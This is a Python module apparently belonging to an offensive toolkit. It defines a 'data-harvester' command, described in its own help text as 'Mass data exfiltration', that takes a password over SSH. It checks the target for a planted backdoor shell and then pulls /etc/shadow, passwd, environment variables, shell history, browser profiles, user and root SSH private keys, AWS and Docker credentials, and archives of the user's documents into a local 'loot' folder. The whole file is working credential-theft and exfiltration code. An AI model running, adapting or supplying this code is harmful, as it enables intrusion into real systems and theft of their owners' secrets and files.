import subprocess, os, sys
from datetime import datetime
from pathlib import Path

class Colors:
    RED='\033[91m';GREEN='\033[92m';YELLOW='\033[93m'
    BLUE='\033[94m';CYAN='\033[96m';MAGENTA='\033[95m'
    BOLD='\033[1m';RESET='\033[0m'

def run_local(cmd,timeout=60):
    try:
        r=subprocess.run(cmd if isinstance(cmd,list) else cmd.split(),capture_output=True,text=True,timeout=timeout)
        return{'ok':r.returncode==0,'out':r.stdout.strip(),'err':r.stderr.strip()}
    except:return{'ok':False,'out':'','err':'ERROR'}

class DataHarvester:
    def __init__(self,target,username,password,domain="",port=22):
        self.target=target;self.username=username;self.password=password
        self.domain=domain;self.port=str(port)
        self.target_os=None;self.is_root=False;self.has_backdoor=False
        self.home_dir=f"/home/{username}"
        safe=target.replace('.','_').replace(':','_')
        self.loot_dir=Path.home()/'grimoire_loot'/safe/'data_harvester'/datetime.now().strftime('%Y%m%d_%H%M%S')
        self.loot_dir.mkdir(parents=True,exist_ok=True)
        self.results=[];self.bytes_exfiltrated=0;self.files_exfiltrated=0

    def log(self,stage,success,detail=""):
        self.results.append((stage,success,detail))
        s=f"{Colors.GREEN}✓{Colors.RESET}" if success else f"{Colors.YELLOW}✗{Colors.RESET}"
        print(f"  [{s}] {stage}")

    def save(self,name,content):
        if content and content.strip():
            p=self.loot_dir/name;p.parent.mkdir(parents=True,exist_ok=True)
            p.write_text(content,errors='ignore')
            self.bytes_exfiltrated+=p.stat().st_size;self.files_exfiltrated+=1
            return True
        return False


    def ssh(self,cmd,timeout=30):
        return run_local(['sshpass','-p',self.password,'ssh','-o','StrictHostKeyChecking=no',
            '-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-p',self.port,
            f'{self.username}@{self.target}',f'/bin/bash --norc --noprofile -c "{cmd}"'],timeout=timeout)

    def scp_get(self,remote,local):
        local=Path(local);local.parent.mkdir(parents=True,exist_ok=True)
        return run_local(['sshpass','-p',self.password,'scp','-o','StrictHostKeyChecking=no',
            '-o','UserKnownHostsFile=/dev/null','-P',self.port,
            f'{self.username}@{self.target}:{remote}',str(local)],timeout=120)

    def detect_os(self):
        r=self.ssh('uname -s 2>/dev/null')
        if r['ok'] and r['out']:
            self.target_os='linux'
            r2=self.ssh('whoami; /bin/bash.backdoor -p -c "id; echo HAS_BACKDOOR" 2>/dev/null')
            if r2['ok']:self.has_backdoor='HAS_BACKDOOR' in r2['out']
            print(f"  [{Colors.GREEN}✓{Colors.RESET}] LINUX");return True
        return False

    def linux_harvest(self):
        print(f"\n{Colors.YELLOW}  SYSTEM{Colors.RESET}")
        for name,cmd in [('os','cat /etc/os-release'),('kernel','uname -a'),('passwd','cat /etc/passwd'),
            ('network','ip addr'),('ports','ss -tlnp'),('env','env')]:
            r=self.ssh(cmd)
            if self.save(f"system/{name}.txt",r['out']):self.log(name,True)

        print(f"\n{Colors.YELLOW}  FILES{Colors.RESET}")
        for f in ['.bash_history','.bashrc','.profile','.gitconfig']:
            remote=f'{self.home_dir}/{f}'
            local=self.loot_dir/'files'/f
            if self.scp_get(remote,local)['ok'] and local.exists():self.log(f'File: {f}',True)

        print(f"\n{Colors.YELLOW}  BROWSERS{Colors.RESET}")
        for name,path in [('firefox','.mozilla/firefox'),('chrome','.config/google-chrome')]:
            full=f'{self.home_dir}/{path}'
            r=self.ssh(f'ls {full} 2>/dev/null && echo FOUND')
            if r['ok'] and 'FOUND' in r['out']:
                self.ssh(f'tar -czf /tmp/{name}.tar.gz {full}/ 2>/dev/null',timeout=120)
                local=self.loot_dir/'browsers'/f'{name}.tar.gz'
                if self.scp_get(f'/tmp/{name}.tar.gz',local)['ok']:self.log(name.title(),True)

        print(f"\n{Colors.YELLOW}  SSH KEYS{Colors.RESET}")
        for d,owner in [(self.home_dir,'user'),('/root','root')]:
            for key in ['id_rsa','id_ed25519','authorized_keys']:
                remote=f'{d}/.ssh/{key}'
                local=self.loot_dir/'ssh_keys'/owner/key
                if self.scp_get(remote,local)['ok'] and local.exists() and local.stat().st_size>0:
                    self.log(f'{owner}/{key}',True)

        print(f"\n{Colors.YELLOW}  CREDS{Colors.RESET}")
        for name,path in [('shadow','/etc/shadow'),('aws',f'{self.home_dir}/.aws/credentials'),
            ('docker',f'{self.home_dir}/.docker/config.json')]:
            r=self.ssh(f'cat {path} 2>/dev/null')
            if self.save(f'creds/{name}.txt',r['out']):self.log(f'Cred: {name}',True)

        print(f"\n{Colors.YELLOW}  EXFIL{Colors.RESET}")
        self.ssh(f'tar -czf /tmp/home.tar.gz {self.home_dir}/Documents {self.home_dir}/Desktop {self.home_dir}/Downloads 2>/dev/null',timeout=120)
        self.log('Home Archive',self.scp_get('/tmp/home.tar.gz',self.loot_dir/'home.tar.gz')['ok'])

    def execute(self):
        if not self.detect_os():return
        print(f"\n{Colors.CYAN}  HARVESTING{Colors.RESET}")
        self.linux_harvest()
        ok=sum(1 for _,s,_ in self.results if s)
        print(f"\n  {Colors.BOLD}Files:{Colors.RESET} {self.files_exfiltrated} | {Colors.BOLD}Score:{Colors.RESET} {ok}/{len(self.results)}")
        print(f"  {Colors.BOLD}Loot:{Colors.RESET} {self.loot_dir}")

    @classmethod
    def register(cls,sub):
        p=sub.add_parser('data-harvester',help='Mass data exfiltration')
        p.add_argument('target');p.add_argument('-u',required=True);p.add_argument('-p',required=True)
        p.add_argument('-d','--domain',default='');p.add_argument('-P','--port',type=int,default=22)
        p.set_defaults(func=cls._run)

    @classmethod
    def _run(cls,args):
        DataHarvester(args.target,args.u,args.p,args.domain,args.port).execute()
